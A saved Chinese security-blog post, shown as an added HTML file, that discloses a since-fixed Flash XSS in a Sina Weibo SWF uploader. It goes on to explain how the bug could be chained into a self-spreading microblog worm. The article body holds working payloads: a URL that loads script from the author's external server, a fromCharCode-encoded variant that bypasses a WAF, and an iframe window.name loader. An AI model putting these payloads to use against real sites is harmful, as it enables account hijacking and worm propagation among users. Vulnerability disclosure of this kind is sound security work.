@@ -1,0 +1,651 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>从新浪微博一处Flash XSS到XSS Worm | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                web前端 &raquo; <a href="sina-weibo-flashxss-worm.html">从新浪微博一处Flash XSS到XSS Worm</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">从新浪微博一处Flash XSS到XSS Worm</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/HTML.html">web前端</a></span>
+  
+  <span class="date">时间: 2015-1-8 0:23</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">6条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="sina-weibo-flashxss-worm.html">20153人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+    
+        <a href="../tag/flashxss.html">flashxss</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>这是我之前提交到新浪应急响应中心的漏洞，因为我看到新浪已经修复了，所以发出来。</p>
+<p>最近一直在研究一些flash，希望能发现点什么。</p>
+<p>偶然发现这样一个swf：<a href="http://vgirl.weibo.com/swf/BlogUp.swf"><a href="http://vgirl.weibo.com/swf/BlogUp.swf">http://vgirl.weibo.com/swf/BlogUp.swf</a></a> （已修复），一般上传swf、播放器这种地方容易出现xss，这个BlogUp.swf就是上传的flash。</p>
+<p>反编译看看，其中有个函数：</p>
+<div class="codehilite"><pre><span></span><span class="kd">private</span> <span class="kd">function</span> <span class="nx">init</span><span class="p">(</span><span class="nb">Number</span><span class="o">:</span><span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="o">::</span><span class="nb">Event</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// debugfile: F:\flash\blogUp_Vgirl\src;;xblogUploadImage.as</span>
+    <span class="nx">stage</span><span class="p">.</span><span class="nx">scaleMode</span> <span class="o">=</span> <span class="nb">StageScaleMode</span><span class="p">.</span><span class="nx">NO_SCALE</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">bIsUploading</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">tList</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
+    <span class="nx">removeEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">init</span><span class="p">);</span>
+    <span class="k">var</span> <span class="nx">loc0</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Sprite</span><span class="p">();</span>
+    <span class="nx">lineStyle</span><span class="p">();</span>
+    <span class="nx">beginFill</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nx">drawRect</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">1000</span><span class="o">,</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">buttonMode</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">MouseEvent</span><span class="p">.</span><span class="nx">CLICK</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">onClicked</span><span class="p">);</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">addChild</span><span class="p">(</span><span class="nx">loc0</span><span class="p">);</span>
+    <span class="k">var</span> <span class="nx">loc2</span><span class="o">:*</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="kc">undefined</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonselectfiles</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onselectfiles&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonsinglecomplete</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onsinglecomplete&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonallcomplete</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onallcomplete&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonerror</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onerror&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">onUploadStart</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onUploadStart&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="k">var</span> <span class="nx">loc1</span><span class="o">:*</span> <span class="o">=</span> <span class="nx">stage</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">parameters</span><span class="p">[</span><span class="s2">&quot;onflashready&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span><span class="o">;</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;setup&quot;</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">setup</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;cancel&quot;</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">closeUploader</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;setMaxSize&quot;</span><span class="o">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">setMaxSize</span><span class="p">);</span>
+    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">loc1</span><span class="p">);</span>
+    <span class="k">return</span><span class="o">;</span>
+
+<span class="p">}</span>
+</pre></div>
+
+
+<p><code>ExternalInterface.call(loc1);</code>这句话很明显存在一个XSS，loc1是之前获取的GET参数<code>stage.loaderInfo.parameters["onflashready"]</code>。</p>
+<p>我们试试：</p>
+<p><a href="../content/uploadfile/201501/9b051420648012.png"><img alt="新浪vgirl flash XSS导致微博蠕虫1766.png" src="../content/uploadfile/201501/9b051420648012.png" /></a></p>
+<p>弹了。其实前面几个参数也是存在XSS的，但这个xss最明显，我就不说前几个了。</p>
+<p>如果ExternalInterface.call函数的第一个参数可控的话，我们最好把POC写成这样：<code>http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){alert(1)})</code> ，因为他和后面的参数组成了一个执行的代码：</p>
+<div class="codehilite"><pre><span></span>(function(){alert(1)})(param1, param2, ...)
+</pre></div>
+
+
+<p>因为我们这里这个漏洞没参数，所以最终执行的javascript实际上是(function(){alert(1)})()，我们将alert(1)换成自己的payload就能干想干的事了。</p>
+<p>然后我想提交，来到sina src看到个公告：</p>
+<p><a href="../content/uploadfile/201501/960f1420648015.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2116.png" src="../content/uploadfile/201501/960f1420648015.png" /></a></p>
+<p>我擦嘞！XSS漏洞都降级了，原因只是因为cookie加了httponly？</p>
+<p>我掐指一算，如果就这样交的话，顶多拿2个金币啊！！</p>
+<p>挖了半天就换这点金币，不行，那么我们想想怎么让我的XSS发挥点作用吧，否则憋屈得很。来个蠕虫吧。</p>
+<p>我关注到vgirl.weibo.com这个站首页是个评分的flash，大概是给MM们评分并分享的。</p>
+<p><a href="../content/uploadfile/201501/4f8a1420648020.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2282.png" src="../content/uploadfile/201501/4f8a1420648020.png" /></a></p>
+<p>有些妹纸还是挺不错的，我喜欢。来分析一下这个flash吧：</p>
+<p><a href="../content/uploadfile/201501/27af1420648021.png"><img alt="新浪vgirl flash XSS导致微博蠕虫2314.png" src="../content/uploadfile/201501/27af1420648021.png" /></a></p>
+<p>这里有5个API很闪眼睛。分析了一下，实际上第一个是获得妹纸列表的，第二个是给妹纸打分的，第三个是分享到微博的，第四个是获得具体妹纸信息的，第五个是关注这个妹纸的。</p>
+<p>很明显，第三个和第五个是我想要的（为毛不是第一个和第四个？）。我可以利用这俩API和之前的XSS，来让浏览的用户发表任意微博并关注我，造成一个微博蠕虫。</p>
+<p>那么继续分析一下API怎么使用（实际上比看flash代码更简单的方式是抓包，抓包大家都会我就不演示了）：</p>
+<div class="codehilite"><pre><span></span><span class="kd">private</span> <span class="kd">function</span> <span class="nx">atShe</span><span class="p">(</span><span class="nx">arg0</span><span class="o">:*</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">var</span> <span class="nx">loc0</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLVariables</span><span class="p">();</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">uid</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">oid</span><span class="o">;</span>
+    <span class="nx">loc0</span><span class="p">.</span><span class="nx">img</span> <span class="o">=</span> <span class="nx">arg0</span><span class="p">.</span><span class="nx">picurl</span><span class="o">;</span>
+    <span class="k">var</span> <span class="nx">loc1</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">atApi</span><span class="p">);</span>
+    <span class="nx">loc1</span><span class="p">.</span><span class="nx">method</span> <span class="o">=</span> <span class="nb">URLRequestMethod</span><span class="p">.</span><span class="nx">POST</span><span class="o">;</span>
+    <span class="nx">loc1</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLVariables</span><span class="p">();</span>
+    <span class="k">var</span> <span class="nx">loc2</span><span class="o">:*</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">URLLoader</span><span class="p">();</span>
+    <span class="nx">load</span><span class="p">(</span><span class="nx">loc1</span><span class="p">);</span>
+    <span class="k">return</span><span class="o">;</span>
+
+<span class="p">}</span>
+</pre></div>
+
+
+<p>这是发表微博的函数，实际上就是发送了一个POST数据包，text是要发表的内容，img是妹纸图片，uid是妹纸的用户ID。</p>
+<p>实际上，text可以写任意文字，img可以是任意图片（属于新浪sinaimg.cn的图片，随便找个图片上传接口传一个即可），uid可以不用填写。</p>
+<p><a href="../content/uploadfile/201501/0fa51420648023.png"><img alt="新浪vgirl flash XSS导致微博蠕虫3008.png" src="../content/uploadfile/201501/0fa51420648023.png" /></a></p>
+<p>如上图，这样一个数据包即可发表一个微博：</p>
+<p><a href="../content/uploadfile/201501/0c3a1420648024.png"><img alt="新浪vgirl flash XSS导致微博蠕虫3032.png" src="../content/uploadfile/201501/0c3a1420648024.png" /></a></p>
+<p>好，有了这个接口，我们就可以来制作一个蠕虫了。</p>
+<p>首先写一个payload，我用了parsec团队的兔子君写的一个javascript辅助工具love.js（<a href="https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md"><a href="https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md">https://github.com/quininer/hisoka/blob/master/doc/LoveJS.md</a></a> &amp;&amp; <a href="https://quininer.github.io/tests/love.js"><a href="https://quininer.github.io/tests/love.js">https://quininer.github.io/tests/love.js</a></a>）来进行数据包的发送。</p>
+<p>然后传到自己的服务器上：</p>
+<p><a href="http://mhz.pw/game/vgirl/poc.js"><a href="http://mhz.pw/game/vgirl/poc.js">http://mhz.pw/game/vgirl/poc.js</a> </a></p>
+<p>首先要清楚这一点，新浪整体对CSRF的防御基本是靠Referer来进行的，所以不管在哪发微博，都会检查referer是否来自合法的域。所以我们这个脚本运行在其他地方是不管用的，但因为我们之前找到了一个flash xss，这个flash是处于新浪vgirl域下的，合法合理。</p>
+<p>所以，我们现在的工作就是让这个flash加载我的js文件。</p>
+<p>最早想到这样一个payload：</p>
+<div class="codehilite"><pre><span></span>http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){document.body.appendChild(document.createElement(&quot;script&quot;)).src=&quot;http://mhz.pw/game/vgirl/poc.js&quot;}) 
+</pre></div>
+
+
+<p>不过运行你会发现，referer是这个的话微博是发送不成功的，我目测是被WAF拦截了还是怎样。</p>
+<p>测试了一下，拦截的是appendChild，这个关键字。</p>
+<p>我想那简单啊，把payload换成</p>
+<div class="codehilite"><pre><span></span>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,41,46,115,114,99,61,34,104,116,116,112,58,47,47,109,104,122,46,112,119,47,103,97,109,101,47,118,103,105,114,108,47,118,103,105,114,108,46,106,115,34))
+</pre></div>
+
+
+<p>就没关键字了。结果执行发现，URL太长了，flash加载不上。</p>
+<p>再想想，如何把URL变短，还要没有关键字？当然是用window.name咯：</p>
+<div class="codehilite"><pre><span></span>&lt;iframe src=&quot;http://vgirl.weibo.com/swf/BlogUp.swf?onflashready=(function(){setTimeout(window.name,0)})&quot; name=&quot;document.body.appendChild(document.createElement(&#39;script&#39;)).src=&#39;http://mhz.pw/game/vgirl/poc.js&#39;&quot; id=&quot;vg&quot;&gt;
+</pre></div>
+
+
+<p>把EXP放在iframe的name里，然后实际的payload就是setTimeout(window.name,0)，执行了window.name等于执行了我的EXP。</p>
+<p>将代码美化一下，传到服务器上。</p>
+<p>访问即可发布类似这样的微博：</p>
+<p><a href="../content/uploadfile/201501/29cf1420648025.png"><img alt="新浪vgirl flash XSS导致微博蠕虫4551.png" src="../content/uploadfile/201501/29cf1420648025.png" /></a></p>
+<p>如果换成吸引人的文字和图片，这样，我的粉丝看了以后，多半是会点进去看看。一旦访问这个链接，也会发表这样一个微博。</p>
+<p>这样一传十十传百。</p>
+<p>形成一个XSS蠕虫，危害很大。同样，我还可以发送一个关注我的数据包，在蠕动的同时，也能无限涨粉。</p>
+<p>碍于法律的限制，我就不做测试了。关于新浪微博蠕虫，我曾经是有测试过的：<a href="http://wooyun.org/bugs/wooyun-2010-065761"><a href="http://wooyun.org/bugs/wooyun-2010-065761">http://wooyun.org/bugs/wooyun-2010-065761</a></a>，在这里可以看到效果图，和厂商回复。</p>
+<p>测试有风险，蠕动需谨慎啊……</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+                
+                    <a href="../tag/flashxss.html">flashxss</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 6 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-2813">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">3</a></div>
+                    <p>&lt;</p>
+                    <span class="comment-time">时间: 2017-07-10 14:36</span>
+                    <span class="comment-reply"><a href="#comment-2813" onclick="reply_to('2813','3')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1923">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">MOMO</a></div>
+                    <p>赞  不说什么了 很不错</p>
+                    <span class="comment-time">时间: 2015-01-21 14:12</span>
+                    <span class="comment-reply"><a href="#comment-1923" onclick="reply_to('1923','MOMO')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1922">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/7487fa0993bc919517c1d87e0116cc43.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">该昵称已屏蔽</a></div>
+                    <p>文字不错，学习学习！！</p>
+                    <span class="comment-time">时间: 2015-01-13 11:01</span>
+                    <span class="comment-reply"><a href="#comment-1922" onclick="reply_to('1922','该昵称已屏蔽')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1921">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/71eadc4dcb2ad0e0633a682c7ff80ced.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://ricter.me" target="_blank" rel="nofollow noopener">Ricter</a></div>
+                    <p>叼叼叼！！！</p>
+                    <span class="comment-time">时间: 2015-01-12 23:33</span>
+                    <span class="comment-reply"><a href="#comment-1921" onclick="reply_to('1921','Ricter')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1919">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/afe4847f0702c35f81cae37402906597.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">东吃</a></div>
+                    <p>叼叼叼！！！</p>
+                    <span class="comment-time">时间: 2015-01-10 11:14</span>
+                    <span class="comment-reply"><a href="#comment-1919" onclick="reply_to('1919','东吃')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1917">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/8ce153400aa9178668da0bca16638aad.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.tinydawn.com/" target="_blank" rel="nofollow noopener">D.M</a></div>
+                    <p>叼叼叼！！！</p>
+                    <span class="comment-time">时间: 2015-01-09 14:44</span>
+                    <span class="comment-reply"><a href="#comment-1917" onclick="reply_to('1917','D.M')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="15ae430629a13e7ae9fdae44e574ccf489dafc7f" />
+</div><div class="col-6">
+<img src="../captcha/image/15ae430629a13e7ae9fdae44e574ccf489dafc7f/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="344" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="wzXSUSREBm4KXNwruEhxupMmcHol8TsNi7lJsXsnZIitvlkPwFeirSPrx4FwHvE5">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="../PENETRATION/javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="../PENETRATION/discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%AE%89%E5%85%A8%E7%8B%97.html">安全狗</a>
+        
+        <a rel="tag" href="../tag/md5.html">md5</a>
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.html">端口扫描</a>
+        
+        <a rel="tag" href="../tag/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS.html">客户端XSS</a>
+        
+        <a rel="tag" href="../tag/appcms.html">appcms</a>
+        
+        <a rel="tag" href="../tag/ctf.html">ctf</a>
+        
+        <a rel="tag" href="../tag/java.html">java</a>
+        
+        <a rel="tag" href="../tag/%E5%A5%BD%E7%89%A9%E6%8E%A8%E8%8D%90.html">好物推荐</a>
+        
+        <a rel="tag" href="../tag/%EF%B9%AA00%E6%88%AA%E6%96%AD.html">%00截断</a>
+        
+        <a rel="tag" href="../tag/%E6%90%AC%E5%AE%B6.html">搬家</a>
+        
+        <a rel="tag" href="../tag/jar%E6%89%93%E5%8C%85.html">jar打包</a>
+        
+        <a rel="tag" href="../tag/fineCMS.html">fineCMS</a>
+        
+        <a rel="tag" href="../tag/Mysql.html">Mysql</a>
+        
+        <a rel="tag" href="../tag/%E8%87%AA%E5%8A%A8%E8%AE%BE%E7%BD%AE.html">自动设置</a>
+        
+        <a rel="tag" href="../tag/exe.html">exe</a>
+        
+        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
+        
+        <a rel="tag" href="../tag/WAF.html">WAF</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
